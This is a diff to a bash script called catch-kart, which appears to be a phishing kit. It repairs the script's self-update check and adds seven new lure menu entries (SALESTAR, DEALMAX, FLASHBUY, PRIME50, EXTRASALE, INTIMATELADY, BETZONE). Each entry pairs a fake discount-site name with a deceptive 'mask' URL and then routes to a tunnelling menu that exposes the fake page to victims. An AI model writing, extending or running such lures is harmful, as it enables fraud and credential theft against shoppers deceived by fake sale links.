@@ -76,10 +76,11 @@ check_update(){
 	clear
 	banner_small ;
 	echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Checking for update : "
-	new_version=$(curl --silent https://github.com/Death-Mask/catch-kart/blob/main/catch-kart.sh | grep '__version__=' | cut -d">" -f2 | cut -d"<" -f1 | cut -d"=" -f 2)
+	# Extract new version using grep and awk for reliability
+	new_version=$(curl --silent https://raw.githubusercontent.com/Death-Mask/catch-kart/main/catch-kart.sh | grep "^__version__=" | awk -F'=' '{print $2}' | tr -d '"' | tr -d "'")
 	tarball_url="https://github.com/000sallam000/catch-kart/archive/refs/tags/${new_version}.tar.gz"
 
-	if [[ $new_version != $__version__ ]]; then
+	if [[ -n "$new_version" && $new_version != $__version__ ]]; then
 		echo -ne "${ORANGE}update found ${RED}Version : ${new_version}\n"${WHITE}
 		sleep 2
 		echo -ne "\n${GREEN}[${WHITE}+${GREEN}]${ORANGE} Downloading Update ${RED}Version : ${new_version} ..."
@@ -548,12 +549,19 @@ main_menu() {
 
 		${RED}[${WHITE}01${RED}]${ORANGE} queen (Women's Clothing)
 		${RED}[${WHITE}02${RED}]${ORANGE} AVERA (shoes)
-		${RED}[${WHITE}03${RED}]${ORANGE} update
+		${RED}[${WHITE}03${RED}]${ORANGE} SALESTAR (إلكترونيات وملابس)
+		${RED}[${WHITE}04${RED}]${ORANGE} DEALMAX (أجهزة منزلية)
+		${RED}[${WHITE}05${RED}]${ORANGE} FLASHBUY (تخفيضات سريعة)
+		${RED}[${WHITE}06${RED}]${ORANGE} PRIME50 (هواتف ذكية)
+		${RED}[${WHITE}07${RED}]${ORANGE} EXTRASALE (تخفيضات إضافية)
+		${RED}[${WHITE}08${RED}]${ORANGE} INTIMATELADY (ملابس داخلية نسائية)
+		${RED}[${WHITE}09${RED}]${ORANGE} BETZONE (موقع مراهنات)
+		${RED}[${WHITE}10${RED}]${ORANGE} update
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
 	EOF
-	
+    
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
 	case $REPLY in 
@@ -566,6 +574,34 @@ main_menu() {
 			mask='https://AVERA-all-prand-in-a-same-site'
 			tunnel_menu;;
 		3 | 03)
+			website="SALESTAR"
+			mask='https://salestar-discount-50'
+			tunnel_menu;;
+		4 | 04)
+			website="DEALMAX"
+			mask='https://dealmax-discount-50'
+			tunnel_menu;;
+		5 | 05)
+			website="FLASHBUY"
+			mask='https://flashbuy-discount-50'
+			tunnel_menu;;
+		6 | 06)
+			website="PRIME50"
+			mask='https://prime50-discount-50'
+			tunnel_menu;;
+		7 | 07)
+			website="EXTRASALE"
+			mask='https://extrasale-discount-50'
+			tunnel_menu;;
+		8 | 08)
+			website="INTIMATELADY"
+			mask='https://intimatelady-discount-50'
+			tunnel_menu;;
+		9 | 09)
+			website="BETZONE"
+			mask='https://betzone-bonus-50'
+			tunnel_menu;;
+		10 | 10)
 			check_update;;
 
 		99)
@@ -575,8 +611,8 @@ main_menu() {
 		*)
 			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 			{ sleep 1; main_menu; };;
-	
-	esac
+    
+esac
 }
 
 ## Main
